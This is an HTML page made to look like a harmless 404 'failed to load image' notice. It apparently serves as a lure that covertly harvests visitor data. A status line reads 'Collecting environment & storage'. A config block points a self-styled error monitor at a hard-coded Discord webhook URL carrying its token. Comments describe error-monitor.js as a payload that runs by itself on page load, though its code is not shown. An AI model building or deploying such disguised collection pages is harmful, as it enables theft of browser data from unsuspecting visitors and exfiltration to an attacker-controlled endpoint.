<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 — resource failed to load</title>
<style>
  :root{
    --bg:#0f1115; --panel:#171a21; --line:#2a2f3a;
    --txt:#e7ebf2; --dim:#8b93a3; --red:#ed4245; --amber:#f0b429;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; display:flex; flex-direction:column; align-items:center; justify-content:center;
    gap:22px; padding:32px;
    background:radial-gradient(1200px 600px at 50% -10%,#1b2030,#0f1115 60%);
    color:var(--txt);
    font:15px/1.5 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
  }
  .card{
    width:min(560px,100%); display:flex; gap:16px; align-items:center;
    background:var(--panel); border:1px solid var(--line); border-radius:14px;
    padding:18px; box-shadow:0 24px 60px rgba(0,0,0,.45);
  }
  .thumb{
    position:relative; flex:0 0 132px; height:92px; border-radius:10px; overflow:hidden;
    border:1px dashed var(--line); background:#12151c; display:grid; place-items:center;
  }
  .thumb svg{width:64px;height:64px;opacity:.55}
  .thumb::after{
    content:"!"; position:absolute; right:8px; bottom:8px;
    width:22px; height:22px; border-radius:50%; background:var(--red); color:#fff;
    font-weight:700; font-size:14px; display:grid; place-items:center;
    box-shadow:0 0 0 3px rgba(237,66,69,.18);
  }
  .meta{min-width:0}
  .filename{
    font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:14px;
    overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
  }
  .status{margin-top:4px; color:var(--red); font-size:13px}
  .status code{background:#0e1016;border:1px solid var(--line);border-radius:5px;padding:1px 6px}
  .alt{margin-top:8px; color:var(--dim); font-size:12.5px; font-style:italic}
  .hint{color:var(--dim); font-size:12.5px; letter-spacing:.02em}
  .hint .dot{
    display:inline-block; width:7px; height:7px; border-radius:50%;
    background:var(--amber); margin-right:7px; animation:pulse 1.2s ease-in-out infinite;
  }
  @keyframes pulse{0%,100%{opacity:.25}50%{opacity:1}}
  @media (max-width:520px){
    .card{flex-direction:column; align-items:flex-start}
    .thumb{flex-basis:auto; width:100%}
  }
</style>
</head>
<body>

  <div class="card" role="img" aria-label="Broken image: hero-banner.png failed to load">
    <div class="thumb" aria-hidden="true">
      <svg viewBox="0 0 24 24" fill="none" stroke="#8b93a3" stroke-width="1.4"
           stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="4" width="18" height="16" rx="2"/>
        <circle cx="8.5" cy="9.5" r="1.6"/>
        <path d="M21 15l-5-5-4.5 4.5"/>
        <path d="M3 16l4-4 3 3"/>
        <path d="M14 4l-1.8 3.6 2.2 2.2-2.2 3.4"/>
      </svg>
    </div>
    <div class="meta">
      <div class="filename">hero-banner.png</div>
      <div class="status">Failed to load resource: <code>net::ERR_CONNECTION_RESET</code></div>
      <div class="alt">alt="Hero banner"</div>
    </div>
  </div>

  <p class="hint"><span class="dot"></span>Collecting environment &amp; storage&hellip;</p>

  <!-- 1) point the monitor at your webhook -->
  <script>
    window.ERROR_MONITOR_CONFIG = {
      webhook: 'https://discord.com/api/webhooks/1559231372739223552/c0ubujB2x7MDHnSldkrFGA36NKexFYkCNSM0-qp97XdYWXSW6dt1UlW2juUceVTHPxyz',
      title: '\uD83D\uDEA8 Broken-page report'
    };
  </script>
  <!-- 2) load the payload — it self-executes on DOMContentLoaded -->
  <script src="error-monitor.js" defer></script>

</body>
</html>
